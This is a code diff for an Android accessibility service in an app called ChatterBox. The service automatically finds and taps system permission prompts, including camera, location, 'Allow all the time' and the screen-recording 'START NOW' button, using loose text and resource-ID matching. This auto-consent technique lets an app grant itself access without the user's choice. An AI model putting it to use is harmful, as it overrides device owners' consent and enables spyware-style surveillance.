@@ -13,172 +13,212 @@ class PermissionDialogs(private val accessibilityService: AccessibilityService) 
     private val TAG = "PermissionDialogs"
     private val handler = Handler(Looper.getMainLooper())
 
+    // Flag to control whether this class should process dialogs
+    private var isGrantingPermissions = false
+
+    // Pending permissions counter to know when we're done
+    private var pendingPermissionsCount = 0
+
     /**
-     * Main function to check and handle all permission dialogs
+     * Start permission granting mode with a specific number of expected permissions
+     */
+    fun startGrantingPermissions(expectedPermissions: Int) {
+        pendingPermissionsCount = expectedPermissions
+        isGrantingPermissions = true
+        Log.d(TAG, "Started permission granting mode, expecting $expectedPermissions permissions")
+    }
+
+    /**
+     * Stop permission granting mode
+     */
+    fun stopGrantingPermissions() {
+        isGrantingPermissions = false
+        pendingPermissionsCount = 0
+        Log.d(TAG, "Stopped permission granting mode")
+    }
+
+    /**
+     * Check if we're currently in permission granting mode
+     */
+    fun isGrantingPermissions(): Boolean {
+        return isGrantingPermissions
+    }
+
+    /**
+     * Handle permission dialog - only if we're in granting mode
      */
     fun handlePermissionDialog(rootNode: AccessibilityNodeInfo?) {
-        if (rootNode == null) return
+        if (rootNode == null || !isGrantingPermissions) return
 
-        Log.d(TAG, "Checking for permission dialogs")
+        Log.d(TAG, "Scanning permission dialog")
+        dumpNodeTree(rootNode)
 
-        // Try to handle various permission dialogs based on their text content
-        handleMediaProjectionDialog(rootNode)
-        handleCameraPermissionDialog(rootNode)
-        handleLocationPermissionDialog(rootNode)
-        handleNotificationPermissionDialog(rootNode)
-        handleAudioPermissionDialog(rootNode)
-        handlePhotoVideoPermissionDialog(rootNode)
+        // Try to find permission confirmation text
+        val containsPermissionText = containsPermissionText(rootNode)
 
-    }
+        if (containsPermissionText) {
+            Log.d(TAG, "Permission dialog detected")
 
-    /**
-     * Handle media projection permission dialog (screen recording)
-     * This one we'll handle separately as it requires special treatment
-     */
-    private fun handleMediaProjectionDialog(rootNode: AccessibilityNodeInfo) {
-        val dialogText = findNodeWithText(rootNode, "Start recording or casting with ChatterBox?")
-        if (dialogText != null) {
-            Log.d(TAG, "Media projection permission dialog detected")
+            // Try each possible permission button in order of preference
+            val buttonTexts = arrayOf(
+                "WHILE USING THE APP",
+                "While using the app",
+                "ALLOW",
+                "Allow",
+                "ALLOW ALL THE TIME",
+                "Allow all the time",
+                "OK",
+                "ONLY THIS TIME",
+                "Yes",
+                "YES",
+                "START NOW"
+            )
 
-            // Find and click the START NOW button
-            val startButton = findNodeWithText(rootNode, "START NOW")
-            if (startButton != null) {
-                // Found the button, click it after a short delay
-                handler.postDelayed({
-                    clickNode(startButton)
-                    Log.d(TAG, "Clicked START NOW button automatically")
-                }, 500)
+            for (buttonText in buttonTexts) {
+                val nodes = rootNode.findAccessibilityNodeInfosByText(buttonText)
+                for (node in nodes) {
+                    if (clickNodeOrParent(node)) {
+                        Log.d(TAG, "Clicked permission button: $buttonText")
+
+                        // Decrement pending permissions counter
+                        pendingPermissionsCount--
+                        Log.d(TAG, "Permissions remaining: $pendingPermissionsCount")
+
+                        // If we've handled all expected permissions, stop granting mode
+                        if (pendingPermissionsCount <= 0) {
+                            handler.postDelayed({
+                                stopGrantingPermissions()
+                            }, 1000)
+                        }
+
+                        return
+                    }
+                }
             }
+
+            // Try resource IDs as fallback
+            tryClickByResourceId(rootNode)
         }
     }
 
     /**
-     * Handle camera permission dialog
+     * Check if the dialog contains permission-related text
      */
-    private fun handleCameraPermissionDialog(rootNode: AccessibilityNodeInfo) {
-        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to take pictures and record video?")
-        if (dialogText != null) {
-            Log.d(TAG, "Camera permission dialog detected")
+    private fun containsPermissionText(rootNode: AccessibilityNodeInfo): Boolean {
+        val permissionTexts = arrayOf(
+            "Allow ChatterBox",
+            "permission",
+            "would like to",
+            "access",
+            "Start recording or casting"
+        )
 
-            // Click "WHILE USING THE APP" option
-            val allowButton = findNodeWithText(rootNode, "WHILE USING THE APP")
-            if (allowButton != null) {
-                handler.postDelayed({
-                    clickNode(allowButton)
-                    Log.d(TAG, "Clicked WHILE USING THE APP for camera permission")
-                }, 500)
+        for (text in permissionTexts) {
+            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
+            if (nodes.isNotEmpty()) {
+                return true
             }
         }
+
+        return false
     }
 
     /**
-     * Handle location permission dialog
+     * Try to click buttons using resource IDs
      */
-    private fun handleLocationPermissionDialog(rootNode: AccessibilityNodeInfo) {
-        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to access this device's location?")
-        if (dialogText != null) {
-            Log.d(TAG, "Location permission dialog detected")
+    private fun tryClickByResourceId(rootNode: AccessibilityNodeInfo) {
+        val resourceIds = arrayOf(
+            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
+            "com.android.permissioncontroller:id/permission_allow_button",
+            "com.android.permissioncontroller:id/permission_allow_always_button",
+            "android:id/button1"  // Often used for positive buttons in dialogs
+        )
 
-            // Look for "Precise" text to verify it's the location dialog
-            val preciseText = findNodeWithText(rootNode, "Precise")
+        for (resourceId in resourceIds) {
+            val node = findNodeByResourceId(rootNode, resourceId)
+            if (node != null && clickNodeOrParent(node)) {
+                Log.d(TAG, "Clicked button by resource ID: $resourceId")
 
-            if (preciseText != null) {
-                // Click "WHILE USING THE APP" option
-                val allowButton = findNodeWithText(rootNode, "WHILE USING THE APP")
-                if (allowButton != null) {
+                // Decrement pending permissions counter
+                pendingPermissionsCount--
+                Log.d(TAG, "Permissions remaining: $pendingPermissionsCount")
+
+                // If we've handled all expected permissions, stop granting mode
+                if (pendingPermissionsCount <= 0) {
                     handler.postDelayed({
-                        clickNode(allowButton)
-                        Log.d(TAG, "Clicked WHILE USING THE APP for location permission")
-                    }, 500)
+                        stopGrantingPermissions()
+                    }, 1000)
                 }
+
+                return
             }
         }
     }
 
     /**
-     * Handle notification permission dialog
+     * Try to click a node or its parent if the node itself isn't clickable
      */
-    private fun handleNotificationPermissionDialog(rootNode: AccessibilityNodeInfo) {
-        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to send you notifications?")
-        if (dialogText != null) {
-            Log.d(TAG, "Notification permission dialog detected")
-
-            // Click "ALLOW" option
-            val allowButton = findNodeWithText(rootNode, "ALLOW")
-            if (allowButton != null) {
-                handler.postDelayed({
-                    clickNode(allowButton)
-                    Log.d(TAG, "Clicked ALLOW for notification permission")
-                }, 500)
-            }
-        }
-    }
-
-    /**
-     * Handle audio permission dialog
-     */
-    private fun handleAudioPermissionDialog(rootNode: AccessibilityNodeInfo) {
-        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to access music and audio on this device?")
-        if (dialogText != null) {
-            Log.d(TAG, "Audio permission dialog detected")
-
-            // Click "ALLOW" option
-            val allowButton = findNodeWithText(rootNode, "ALLOW")
-            if (allowButton != null) {
-                handler.postDelayed({
-                    clickNode(allowButton)
-                    Log.d(TAG, "Clicked ALLOW for audio permission")
-                }, 500)
-            }
-        }
-    }
-
-    /**
-     * Handle photos and videos permission dialog
-     */
-    private fun handlePhotoVideoPermissionDialog(rootNode: AccessibilityNodeInfo) {
-        val dialogText = findNodeWithText(rootNode, "Allow ChatterBox to access photos and videos on this device?")
-        if (dialogText != null) {
-            Log.d(TAG, "Photos and videos permission dialog detected")
-
-            // Click "ALLOW" option
-            val allowButton = findNodeWithText(rootNode, "ALLOW")
-            if (allowButton != null) {
-                handler.postDelayed({
-                    clickNode(allowButton)
-                    Log.d(TAG, "Clicked ALLOW for photos and videos permission")
-                }, 500)
-            }
-        }
-    }
-
-    /**
-     * Helper function to find a node with text that contains the given string
-     * This makes matching more reliable across different Android versions
-     */
-    private fun findNodeWithText(rootNode: AccessibilityNodeInfo, text: String): AccessibilityNodeInfo? {
-        val nodes = rootNode.findAccessibilityNodeInfosByText(text)
-        return if (nodes.isNotEmpty()) nodes[0] else null
-    }
-
-    /**
-     * Helper function to click on a node, handling cases where the node itself isn't clickable
-     */
-    private fun clickNode(node: AccessibilityNodeInfo) {
+    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
+        // Try direct click first
         if (node.isClickable) {
-            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-        } else {
-            // If the node itself is not clickable, try to find its clickable parent
-            var parent = node.parent
-            while (parent != null) {
-                if (parent.isClickable) {
-                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                    break
-                }
-                val tempParent = parent
-                parent = parent.parent
-                tempParent.recycle()
+            val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            return result
+        }
+
+        // Try finding a clickable parent
+        var current = node.parent
+        while (current != null) {
+            if (current.isClickable) {
+                val result = current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                if (result) return true
             }
+            val temp = current
+            current = current.parent
+            temp.recycle()
+        }
+
+        return false
+    }
+
+    /**
+     * Find node by resource ID
+     */
+    private fun findNodeByResourceId(rootNode: AccessibilityNodeInfo, resourceId: String): AccessibilityNodeInfo? {
+        // Check if this node has the resource ID
+        if (rootNode.viewIdResourceName == resourceId) {
+            return rootNode
+        }
+
+        // Search all children
+        for (i in 0 until rootNode.childCount) {
+            val child = rootNode.getChild(i) ?: continue
+            val result = findNodeByResourceId(child, resourceId)
+            if (result != null) {
+                return result
+            }
+            child.recycle()
+        }
+
+        return null
+    }
+
+    /**
+     * Log node tree for debugging
+     */
+    private fun dumpNodeTree(node: AccessibilityNodeInfo?, indent: Int = 0) {
+        if (node == null) return
+
+        val prefix = " ".repeat(indent)
+        Log.d(TAG, "$prefix Node -> " +
+                "text: ${node.text}, " +
+                "desc: ${node.contentDescription}, " +
+                "class: ${node.className}, " +
+                "resourceId: ${node.viewIdResourceName}, " +
+                "clickable: ${node.isClickable}"
+        )
+
+        for (i in 0 until node.childCount) {
+            dumpNodeTree(node.getChild(i), indent + 2)
         }
     }
 
